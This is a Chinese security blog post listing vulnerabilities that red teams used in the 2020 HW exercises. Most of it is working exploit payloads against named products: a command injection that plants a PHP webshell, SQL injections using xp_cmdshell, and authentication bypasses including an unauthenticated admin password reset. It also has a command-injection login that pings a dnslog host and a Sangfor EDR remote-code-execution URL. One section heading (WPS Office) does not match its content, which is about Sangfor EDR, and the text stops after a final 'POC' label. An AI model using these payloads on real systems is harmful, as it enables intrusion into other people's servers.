<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="2020 HW - 漏洞汇总"><meta name="keywords" content="RCE,SQL Injection"><meta name="author" content="ColdSnap"><meta name="copyright" content="ColdSnap"><title>2020 HW - 漏洞汇总 | ColdSnap の Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-4826942730187324',
  enable_page_level_ads: 'true'
});
</script><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '6.3.0'
} </script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ColdSnap の Blog" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabilities"><span class="toc-number">2.</span> <span class="toc-text">Vulnerabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CNVD-2019-20835"><span class="toc-number">2.1.</span> <span class="toc-text">齐治堡垒机前远程命令执行漏洞 [CNVD-2019-20835]</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">NO.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-2"><span class="toc-number">2.1.2.</span> <span class="toc-text">NO.2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.</span> <span class="toc-text">天融信 TopApp-LB 负载均衡系统SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-1-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">NO.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-2-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">NO.2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-3"><span class="toc-number">2.2.3.</span> <span class="toc-text">NO.3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%8F%8B-GRP-u8-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">用友 GRP-u8 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BF%E7%9B%9F-UTS-%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text">绿盟 UTS 综合威胁探针管理员任意登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B"><span class="toc-number">2.4.1.</span> <span class="toc-text">实际案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">2.5.</span> <span class="toc-text">天融信数据防泄漏系统越权修改管理员密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WPS-Office-%E5%9B%BE%E7%89%87%E8%A7%A3%E6%9E%90%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%A0%86%E6%8D%9F%E5%9D%8FRCE"><span class="toc-number">2.6.</span> <span class="toc-text">WPS Office 图片解析错误导致堆损坏RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D-EDR-%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.7.</span> <span class="toc-text">深信服 EDR 漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sangfor-EDR-RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.8.</span> <span class="toc-text">sangfor EDR RCE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E8%BD%AF%E7%A7%91%E6%8A%80%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.9.</span> <span class="toc-text">联软科技产品存在任意文件上传和命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-Bsh-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.10.</span> <span class="toc-text">泛微OA Bsh 远程代码执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-e-cology-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.11.</span> <span class="toc-text">泛微OA e-cology SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D-VPN-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.12.</span> <span class="toc-text">深信服 VPN 远程代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D-VPN-%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">2.13.</span> <span class="toc-text">深信服 VPN 口令爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BE%B9%E7%95%8C%E4%BA%A7%E5%93%81-%E9%98%B2%E7%81%AB%E5%A2%99-%E7%BD%91%E5%85%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-VPN-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.14.</span> <span class="toc-text">常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thinkphp-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.15.</span> <span class="toc-text">Thinkphp 相关漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.16.</span> <span class="toc-text">Spring 系列漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solr-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.17.</span> <span class="toc-text">Solr 系列漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ghostscript-%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.18.</span> <span class="toc-text">Ghostscript 上传图片代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.19.</span> <span class="toc-text">泛微云桥任意文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%91%9E%E8%BE%BE-WebVPN-RCE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.20.</span> <span class="toc-text">网瑞达 WebVPN RCE 漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-DolphinScheduler-%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-CVE-2020-11974%E3%80%81CVE-2020-13922"><span class="toc-number">2.21.</span> <span class="toc-text">Apache DolphinScheduler 高危漏洞 [CVE-2020-11974、CVE-2020-13922]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF-phpMyadmin-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.22.</span> <span class="toc-text">宝塔面板 phpMyadmin 未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exchange-Server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-16875"><span class="toc-number">2.23.</span> <span class="toc-text">Exchange Server 远程代码执行漏洞 [CVE-2020-16875]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PhpStudy-nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.24.</span> <span class="toc-text">PhpStudy nginx 解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991"><span class="toc-number">2.25.</span> <span class="toc-text">Apache Cocoon XML注入 [CVE-2020-11991]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.26.</span> <span class="toc-text">Horde Groupware Webmail Edition 远程命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">2.27.</span> <span class="toc-text">通达OA任意用户登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.28.</span> <span class="toc-text">通达OA v11.7 后台SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wordpress-File-manager-%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.29.</span> <span class="toc-text">Wordpress File-manager 插件任意文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pligg-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-25287"><span class="toc-number">2.30.</span> <span class="toc-text">Pligg CMS远程代码执行 [CVE-2020-25287]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZeroLogon%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E-CVE-2020-1472"><span class="toc-number">2.31.</span> <span class="toc-text">ZeroLogon接管域控权限漏洞 [CVE-2020-1472]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkAdminV6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">2.32.</span> <span class="toc-text">ThinkAdminV6 任意文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-1181"><span class="toc-number">2.33.</span> <span class="toc-text">SharePoint远程代码执行 [CVE-2020-1181]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">2.34.</span> <span class="toc-text">深信服 SSL VPN 任意密码重置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E6%89%8B%E6%9C%BA%E5%8F%B7"><span class="toc-number">2.35.</span> <span class="toc-text">深信服 SSL VPN 修改任意账户手机号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA-v11-6-%E7%89%88%E6%9C%ACRCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.36.</span> <span class="toc-text">通达OA v11.6 版本RCE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#F5%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1-RCE-CVE-2020-5902"><span class="toc-number">2.37.</span> <span class="toc-text">F5负载均衡 RCE [CVE-2020-5902]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastadmin-%E5%89%8D%E5%8F%B0-getshell-csrf-xss"><span class="toc-number">2.38.</span> <span class="toc-text">fastadmin 前台 getshell + csrf + xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-1-2"><span class="toc-number">2.38.1.</span> <span class="toc-text">NO.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-2-2"><span class="toc-number">2.38.2.</span> <span class="toc-text">NO.2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-3-1"><span class="toc-number">2.38.3.</span> <span class="toc-text">NO.3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Appendix"><span class="toc-number">3.</span> <span class="toc-text">Appendix</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">ColdSnap</div><div class="author-info__description text-center">Welcome to ColdSnap の Blog</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/Coldwave96">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">91</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">41</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">35</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://bodhidharmalu.github.io">Tigerlu</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://ghealer.top">Ghealer</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">ColdSnap の Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/Library">Library</a><a class="site-page" href="/Tools">Tools</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">2020 HW - 漏洞汇总</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-10</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Vulnerabilities/">Vulnerabilities</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Vulnerabilities/WEB/">WEB</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">4.8k</span><span class="post-meta__separator">|</span><span>阅读时长: 20 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>2020年HW期间红队使用的热门漏洞汇总。</p>
<span id="more"></span>

<h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><h3 id="齐治堡垒机前远程命令执行漏洞-CNVD-2019-20835"><a href="#齐治堡垒机前远程命令执行漏洞-CNVD-2019-20835" class="headerlink" title="齐治堡垒机前远程命令执行漏洞 [CNVD-2019-20835]"></a>齐治堡垒机前远程命令执行漏洞 [CNVD-2019-20835]</h3><h4 id="NO-1"><a href="#NO-1" class="headerlink" title="NO.1"></a>NO.1</h4><p>假设10.20.10.10为堡垒机的IP地址。</p>
<ul>
<li><p>访问<code>http://10.20.10.11/listener/cluster_manage.php</code>返回”OK”(未授权无需登录)</p>
</li>
<li><p>执行<a target="_blank" rel="noopener" href="https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1$%7BIFS%7D%7C%60echo$%7BIFS%7D%22ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK%22%7Cbase64$%7BIFS%7D-d%7Cbash%60%7C$%7BIFS%7D%7Cecho$%7BIFS%7D">https://10.20.10.10/ha_request.php?action&#x3D;install&amp;ipaddr&#x3D;10.20.10.11&amp;node_id&#x3D;1${IFS}|<code>echo$&#123;IFS&#125;&quot;ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64$&#123;IFS&#125;-d|bash</code>|${IFS}|echo${IFS}</a>链接即可getshell，执行成功后，生成PHP一句话马<code>/var/www/shterm/resources/qrcode/lbj77.php</code>密码<code>10086</code>。</p>
</li>
</ul>
<p><img src="/img/HW-Vuln/HW1.png"></p>
<ul>
<li>访问地址为<code>https://10.20.10.10/shterm/resources/qrcode/lbj77.php</code>(密码<code>10086</code>)</li>
</ul>
<h4 id="NO-2"><a href="#NO-2" class="headerlink" title="NO.2"></a>NO.2</h4><p>据说还有另外一个版本是java的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /shterm/listener/tui_update.php</span><br><span class="line"></span><br><span class="line">a=[&quot;t&#x27;;import os;os.popen(&#x27;whoami&#x27;)#&quot;]</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW2.png"></p>
<h3 id="天融信-TopApp-LB-负载均衡系统SQL注入漏洞"><a href="#天融信-TopApp-LB-负载均衡系统SQL注入漏洞" class="headerlink" title="天融信 TopApp-LB 负载均衡系统SQL注入漏洞"></a>天融信 TopApp-LB 负载均衡系统SQL注入漏洞</h3><h4 id="NO-1-1"><a href="#NO-1-1" class="headerlink" title="NO.1"></a>NO.1</h4><p>利用POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /acc/clsf/report/datasource.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Connection: close</span><br><span class="line">Accept: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr(&#x27;a&#x27;,1,1),11,12,13,14,15,16,17,18,19,20,21,22-- +&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@。。</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW3.png"></p>
<h4 id="NO-2-1"><a href="#NO-2-1" class="headerlink" title="NO.2"></a>NO.2</h4><p><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/21626/">天融信负载均衡TopApp-LB系统无需密码直接登陆</a></p>
<p>用户名随意，密码：<code>;id</code></p>
<h4 id="NO-3"><a href="#NO-3" class="headerlink" title="NO.3"></a>NO.3</h4><p><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/22193/">天融信TopApp-LB负载均衡命令执行漏洞</a></p>
<p>用户名: <code>; ping 9928e5.dnslog.info; echo</code>，密码任意</p>
<p><img src="/img/HW-Vuln/HW4.png"></p>
<h3 id="用友-GRP-u8-注入"><a href="#用友-GRP-u8-注入" class="headerlink" title="用友 GRP-u8 注入"></a>用友 GRP-u8 注入</h3><p>利用POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">POST /Proxy HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 341</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cVer=9.8.0&amp;dp=&lt;?xml version=&quot;1.0&quot; encoding=&quot;GB2312&quot;?&gt;</span><br><span class="line">    &lt;R9PACKET version=&quot;1&quot;&gt;</span><br><span class="line">        &lt;DATAFORMAT&gt;</span><br><span class="line">            XML</span><br><span class="line">        &lt;/DATAFORMAT&gt; </span><br><span class="line">        &lt;R9FUNCTION&gt;</span><br><span class="line">            &lt;NAME&gt;</span><br><span class="line">                AS_DataRequest</span><br><span class="line">            &lt;/NAME&gt;</span><br><span class="line">            &lt;PARAMS&gt;</span><br><span class="line">                &lt;PARAM&gt;</span><br><span class="line">                &lt;NAME&gt;</span><br><span class="line">                    ProviderName</span><br><span class="line">                &lt;/NAME&gt;</span><br><span class="line">                &lt;DATA format=&quot;text&quot;&gt;</span><br><span class="line">                    DataSetProviderData</span><br><span class="line">                &lt;/DATA&gt;</span><br><span class="line">            &lt;/PARAM&gt;</span><br><span class="line">            &lt;PARAM&gt;</span><br><span class="line">            &lt;NAME&gt;</span><br><span class="line">                Data</span><br><span class="line">            &lt;/NAME&gt;</span><br><span class="line">            &lt;DATA format=&quot;text&quot;&gt;</span><br><span class="line">                exec xp_cmdshell &#x27;whoami&#x27;</span><br><span class="line">            &lt;/DATA&gt;</span><br><span class="line">            &lt;/PARAM&gt;</span><br><span class="line">            &lt;/PARAMS&gt;</span><br><span class="line">        &lt;/R9FUNCTION&gt;</span><br><span class="line">    &lt;/R9PACKET&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW5.png"></p>
<h3 id="绿盟-UTS-综合威胁探针管理员任意登录"><a href="#绿盟-UTS-综合威胁探针管理员任意登录" class="headerlink" title="绿盟 UTS 综合威胁探针管理员任意登录"></a>绿盟 UTS 综合威胁探针管理员任意登录</h3><p>逻辑漏洞，利用方式参考：<a target="_blank" rel="noopener" href="https://www.hackbug.net/archives/112.html">https://www.hackbug.net/archives/112.html</a></p>
<ul>
<li><p>1、修改登录数据包 {“status”:false,”mag”:””} -&gt; {“status”:true,”mag”:””}</p>
</li>
<li><p>2、<code>/webapi/v1/system/accountmanage/account</code>接口逻辑错误泄漏了管理员的账户信息包括密码（md5）</p>
</li>
<li><p>3、再次登录，替换密码上个数据包中md5密码</p>
</li>
<li><p>4、登录成功</p>
</li>
</ul>
<h4 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h4><p><img src="/img/HW-Vuln/HW6.png"></p>
<p>对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码：</p>
<p><img src="/img/HW-Vuln/HW7.png"></p>
<p><img src="/img/HW-Vuln/HW8.png"></p>
<p>利用取得的md5值去登录页面：</p>
<p><img src="/img/HW-Vuln/HW9.png"></p>
<p><img src="/img/HW-Vuln/HW10.png"></p>
<h3 id="天融信数据防泄漏系统越权修改管理员密码"><a href="#天融信数据防泄漏系统越权修改管理员密码" class="headerlink" title="天融信数据防泄漏系统越权修改管理员密码"></a>天融信数据防泄漏系统越权修改管理员密码</h3><p>无需登录权限，由于修改密码处未校验原密码，且<code>/?module=auth_user&amp;action=mod_edit_pwd</code>，接口未授权访问，造成直接修改任意用户密码，默认superman账户uid为1。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /?module=auth_user&amp;action=mod_edit_pwd</span><br><span class="line">Cookie: username=superman;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</span><br></pre></td></tr></table></figure>

<h3 id="WPS-Office-图片解析错误导致堆损坏RCE"><a href="#WPS-Office-图片解析错误导致堆损坏RCE" class="headerlink" title="WPS Office 图片解析错误导致堆损坏RCE"></a>WPS Office 图片解析错误导致堆损坏RCE</h3><p>fofa指纹：<code>title=&quot;SANGFOR终端检测响应平台&quot;</code>。</p>
<p>漏洞利用：<code>https://ip/ui/login.php?user=需登录的用户名</code>。例如<code>https://1.1.1.1:1980/ui/login.php?user=admin</code>，查询完毕以后即可登录平台。</p>
<h3 id="深信服-EDR-漏洞"><a href="#深信服-EDR-漏洞" class="headerlink" title="深信服 EDR 漏洞"></a>深信服 EDR 漏洞</h3><p>漏洞利用方法：<code>https://xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&amp;host=whoami</code>。</p>
<p><img src="/img/HW-Vuln/HW11.png"></p>
<p>网上已经放出批量利用方法了，如<a target="_blank" rel="noopener" href="https://github.com/A2gel/sangfor-edr-exploit">https://github.com/A2gel/sangfor-edr-exploit</a>。</p>
<h3 id="sangfor-EDR-RCE漏洞"><a href="#sangfor-EDR-RCE漏洞" class="headerlink" title="sangfor EDR RCE漏洞"></a>sangfor EDR RCE漏洞</h3><p>利用POC：</p>
